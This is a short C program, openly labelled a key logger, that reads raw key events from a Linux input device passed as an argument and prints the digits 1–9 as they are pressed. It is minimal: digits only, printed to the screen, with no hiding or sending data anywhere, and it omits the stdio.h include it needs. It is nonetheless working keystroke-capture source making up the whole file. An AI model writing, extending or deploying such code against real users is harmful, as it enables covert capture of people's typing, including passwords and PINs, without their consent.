#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        exit(-1);
    }
    printf("KEY LOGGER ...\n");
    int fd = open(argv[1], O_RDONLY, 0);
    struct input_event ie;
    while(1) {
        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY) {
                continue;
        }
        if (ie.value != 1) {
                continue;
        }
        if (ie.code >= 2 && ie.code <= 10) {
                printf("%d", ie.code-1);
        }
    }
}
